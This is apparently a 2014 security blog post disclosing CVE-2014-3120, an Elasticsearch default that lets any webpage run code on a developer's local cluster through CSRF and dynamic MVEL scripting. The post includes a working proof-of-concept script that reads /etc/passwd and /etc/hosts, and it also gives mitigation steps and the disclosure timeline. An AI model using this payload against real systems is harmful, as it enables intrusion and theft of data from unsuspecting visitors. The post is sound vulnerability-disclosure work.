{
  "Source": "bou.ke",
  "Title": "Insecure default in Elasticsearch enables remote code execution",
  "Link": "https://bou.ke/blog/elasticsearch-rce/",
  "Content": "\u003cdiv class=\"content\"\u003e\n\u003cdiv class=\"post\"\u003e\n  \u003ch1\u003eInsecure default in Elasticsearch enables remote code execution\u003c/h1\u003e\n  \u003cp\u003eElasticsearch has a flaw in its default configuration which makes it possible for any webpage to execute arbitrary code on visitors with Elasticsearch installed. If you’re running Elasticsearch in development please read \u003ca href=\"#how_to_secure_against_this_vulnerability\"\u003ethe instructions\u003c/a\u003e on how to secure your machine. Elasticsearch version 1.2 (which is unreleased as of writing) is not vulnerable to remote code execution, but still has some security concerns.\u003c/p\u003e\n\n\u003ch2 id=\"the-problems\"\u003eThe problem(s)\u003c/h2\u003e\n\u003cp\u003eThere are a couple of problems which enable the proof of concept I’m going to present:\u003c/p\u003e\n\n\u003cul\u003e\n  \u003cli\u003eElasticsearch has no access roles or authentication mechanism. This means that you have full control over a cluster the moment you connect to it.\u003c/li\u003e\n  \u003cli\u003eThe API for Elasticsearch is accessible over \u003ca href=\"https://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-http.html\" target=\"_blank\"\u003eHTTP\u003c/a\u003e and provides no CSRF protection whatsoever.\u003c/li\u003e\n  \u003cli\u003eIt contains a \u003ca href=\"https://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html\" target=\"_blank\"\u003efeature\u003c/a\u003e which makes it possible to evaluate expressions as part of a query. An example usage of this feature is to specify a custom scoring function while searching through documents. It uses the \u003ca href=\"https://mvel.codehaus.org/\" target=\"_blank\"\u003eMVEL\u003c/a\u003e language by default.\u003c/li\u003e\n  \u003cli\u003eUp to version 1.2 \u003ca href=\"https://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html#_enabling_dynamic_scripting\" target=\"_blank\"\u003edynamic scripting\u003c/a\u003e (which makes it possible to send scripts to the cluster on the fly) was enabled by default. As mentioned in the documentation, this feature gives someone the same priviliges as the user that runs Elasticsearch. MVEL has no sandboxing at all.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThere are no issues up to this point as long as you properly follow the documentation and make sure your Elasticsearch cluster is not available from the outside world. There is one target that isn’t mentioned in the documentation though: The Developer! When you’re developing an application that uses Elasticsearch, you probably have it running on your machine. The default port is \u003ccode class=\"language-plaintext highlighter-rouge\"\u003e9200\u003c/code\u003e and because there is no CSRF protection any webpage can just connect to the cluster using \u003ccode class=\"language-plaintext highlighter-rouge\"\u003elocalhost:9200\u003c/code\u003e as the host.\u003c/p\u003e\n\n\u003ch2 id=\"poc\"\u003ePoC\u003c/h2\u003e\n\u003cp\u003eThe following script will read \u003ccode class=\"language-plaintext highlighter-rouge\"\u003e/etc/hosts\u003c/code\u003e and \u003ccode class=\"language-plaintext highlighter-rouge\"\u003e/etc/passwd\u003c/code\u003e from a user visiting a webpage and display the contents in the browser.\u003c/p\u003e\n\n\u003cpre class=\"code\"\u003eread_file = (filename) -\u0026gt;\n  \u0026#34;\u0026#34;\u0026#34;\n  import java.io.File;\n  import java.util.Scanner;\n  new Scanner(new File(\u0026#34;#{filename}\u0026#34;)).useDelimiter(\u0026#34;\\\\\\\\Z\u0026#34;).next();\n  \u0026#34;\u0026#34;\u0026#34;\n\n# This PoC assumes that there is at least one document stored in Elasticsearch, there are ways around that though\n$ -\u0026gt;\n  payload = {\n    \u0026#34;size\u0026#34;: 1,\n    \u0026#34;query\u0026#34;: {\n      \u0026#34;filtered\u0026#34;: {\n        \u0026#34;query\u0026#34;: {\n          \u0026#34;match_all\u0026#34;: {\n          }\n        }\n      }\n    },\n    \u0026#34;script_fields\u0026#34;: {}\n  }\n\n  for filename in [\u0026#34;/etc/hosts\u0026#34;, \u0026#34;/etc/passwd\u0026#34;]\n    payload[\u0026#34;script_fields\u0026#34;][filename] = {\u0026#34;script\u0026#34;: read_file(filename)}\n\n  $.getJSON \u0026#34;http://localhost:9200/_search?source=#{encodeURIComponent(JSON.stringify(payload))}\u0026amp;callback=?\u0026#34;, (data) -\u0026gt;\n    console.log(data)\n    for hit in data[\u0026#34;hits\u0026#34;][\u0026#34;hits\u0026#34;]\n      for filename, contents of hit[\u0026#34;fields\u0026#34;]\n        document.write(\u0026#34;\u0026lt;h2\u0026gt;#{filename}\u0026lt;/h2\u0026gt;\u0026#34;)\n        for content in contents\n          document.write(\u0026#34;\u0026lt;pre\u0026gt;\u0026#34; + content + \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;)\n        document.write(\u0026#34;\u0026lt;hr\u0026gt;\u0026#34;)\n\u003c/pre\u003e\n\n\u003cp\u003eYou can verify whether you’re vulnerable by trying out the above PoC \u003ca href=\"/blog/elasticsearch-rce/poc.html\" target=\"_blank\"\u003ehere\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eThere are many ways to exploit this, you could link the victim to the page or embed it as an Iframe. You can even exploit this by crafting a URL and using it as the \u003ccode class=\"language-plaintext highlighter-rouge\"\u003esrc\u003c/code\u003e of an \u003ccode class=\"language-plaintext highlighter-rouge\"\u003e\u0026lt;img\u0026gt;\u003c/code\u003e, as the only thing that needs to happen is a single GET request. No user interaction required!\u003c/p\u003e\n\n\u003cp\u003eBecause this is so easily exploitable you can mass-pwn developers with relatively little work.\u003c/p\u003e\n\n\u003ch2 id=\"how-to-secure-against-this-vulnerability\"\u003eHow to secure against this vulnerability\u003c/h2\u003e\n\n\u003cp\u003eAdd the following line to your \u003ccode class=\"language-plaintext highlighter-rouge\"\u003eelasticsearch.yml\u003c/code\u003e to disable dynamic scripting and prevent remote code execution:\u003c/p\u003e\n\n\u003cpre class=\"code\"\u003escript.disable_dynamic: true\n\u003c/pre\u003e\n\n\u003cp\u003eYou should also make sure that your local Elasticsearch instance is only binding on \u003ccode class=\"language-plaintext highlighter-rouge\"\u003elocalhost\u003c/code\u003e, as someone could exploit you over LAN without making you visit a webpage if you don’t. The Homebrew Elasticsearch formula does this automatically. This still means you’re vulnerable to the CSRF exploit though!\u003c/p\u003e\n\n\u003cp\u003eIf you want to be as secure as possible, you should run Elasticsearch inside a virtual machine, to make sure it has no access to the hosting machine at all.\u003c/p\u003e\n\n\u003ch2 id=\"additional-targets\"\u003eAdditional targets\u003c/h2\u003e\n\n\u003cp\u003eDisabling scripting will prevent code execution, but that still leaves us with the issue of being able to query and administer the instance without limit. A webpage can easily dump the whole database running on your machine, sensitive data included. This is impossible to fix by the Elasticsearch developers without adding authentication or CSRF protection.\u003c/p\u003e\n\n\u003cp\u003eIf an attacker can figure out the internal address of your production Elasticsearch instance, you’re also open to leaking your production data. If your development machine is connected to a VPN which provides access to your Elasticsearch cluster, an attacker can easily query or \u003ca href=\"https://www.elasticsearch.org/guide/en/elasticsearch/reference/current/cluster-nodes-shutdown.html\" target=\"_blank\"\u003eshut down\u003c/a\u003e your cluster simply by making you visit a webpage.\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"https://news.ycombinator.com/item?id=7732540\" target=\"_blank\"\u003eHackernews\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"https://www.reddit.com/r/netsec/comments/25cuun/insecure_default_in_elasticsearch_enables_remote/\" target=\"_blank\"\u003eReddit\u003c/a\u003e\u003c/p\u003e\n\n\u003ch3 id=\"notes\"\u003eNotes\u003c/h3\u003e\n\n\u003cul\u003e\n  \u003cli\u003eThis issue has been assigned \u003ca href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3120\" target=\"_blank\"\u003eCVE-2014-3120\u003c/a\u003e.\u003c/li\u003e\n  \u003cli\u003eThis exploit was tested against Elasticsearch version 1.1.1 on MacOSX installed through Homebrew. No configuration changes were made.\u003c/li\u003e\n  \u003cli\u003eI notified Elasticsearch through their \u003ca href=\"https://www.elasticsearch.org/community/security/\" target=\"_blank\"\u003esecurity report instructions\u003c/a\u003e on the 26th of April 2014. They replied they were aware of it, but didn’t intend to do a security release and instead \u003ca href=\"https://github.com/elasticsearch/elasticsearch/issues/5853\" target=\"_blank\"\u003edisable\u003c/a\u003e dynamic scripting by default in version 1.2.\u003c/li\u003e\n  \u003cli\u003eThis security issue has been indepently discovered and \u003ca href=\"https://www.found.no/foundation/elasticsearch-security/#staying-safe-while-developing-with-elasticsearch\" target=\"_blank\"\u003eblogged about\u003c/a\u003e on December 9th 2013.\u003c/li\u003e\n\u003c/ul\u003e\n\n  \u003cp\u003e\u003cspan class=\"date\"\u003eMay 2014\u003c/span\u003e\u003c/p\u003e\n\u003c/div\u003e\n\u003c/div\u003e",
  "Date": "2014-05-01T00:00:00Z",
  "Author": "bou.ke"
}